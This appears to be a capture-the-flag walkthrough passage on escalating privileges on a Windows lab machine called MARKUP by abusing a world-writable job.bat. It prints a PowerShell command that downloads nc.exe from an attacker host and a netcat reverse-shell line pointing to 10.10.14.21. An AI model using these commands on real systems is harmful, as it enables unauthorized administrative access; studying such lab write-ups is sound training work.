Looking around we find a `Log-Management` folder in `c:\`
There is a `job.bat` script that requires admin privs to run and clears system event logs

We can use `icacls` command to view permissions on file

```
daniel@MARKUP c:\Log-Management>icacls job.bat
job.bat BUILTIN\Users:(F)
        NT AUTHORITY\SYSTEM:(I)(F)
        BUILTIN\Administrators:(I)(F)
        BUILTIN\Users:(I)(RX)
```

The (F) after `BUILTIN\Users` means the Users group has FULL permissions of the file. Meaning you can write to it.

We can write a reverse shell to it by using `echo`
`echo PAYLOAD > job.bat`

We will need to get nc.exe onto the server. I have one saved to `/opt/nc.exe'` serve it up and get it using this command

`powershell -c "Invoke-WebRequest" -Uri 'http://10.10.14.21:80/nc.exe' -OutFile 'c:\log-management\nc.exe'`



We then write our reverse shell payload to `job.bat`

```
echo c:\Log-Management\nc.exe -e cmd.exe 10.10.14.21 4444 > job.bat
```

Set up a listener on your attack machine and you will receive a shell back with admin privs








